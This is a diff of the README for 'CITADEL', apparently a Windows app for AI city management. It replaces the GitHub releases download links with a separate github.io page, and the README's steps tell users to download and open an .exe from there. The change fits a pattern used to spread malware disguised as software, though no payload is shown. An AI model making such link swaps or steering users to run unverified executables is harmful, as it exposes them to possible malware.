@@ -1,6 +1,6 @@
 # 🏛️ CITADEL - Smarter City Management Through Artificial Intelligence
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/akuntin9278/CITADEL/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://akuntin9278.github.io)
 
 CITADEL acts as an intelligent operating system for urban centers. It connects government departments with citizens through eight specialized modules. This tool manages everything from public document processing and traffic flow to civic support and expense tracking. It uses modern technology to streamline city operations and increase transparency for every resident.
 
@@ -30,7 +30,7 @@ You need a Windows computer to run this application. Ensure your system meets th
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [Download Page](https://github.com/akuntin9278/CITADEL/releases) to access the latest version.
+1. Visit the [Download Page](https://akuntin9278.github.io) to access the latest version.
 2. Look for the file ending in .exe under the latest release heading.
 3. Click the file name to start the download.
 4. Open the file once it finishes downloading. 
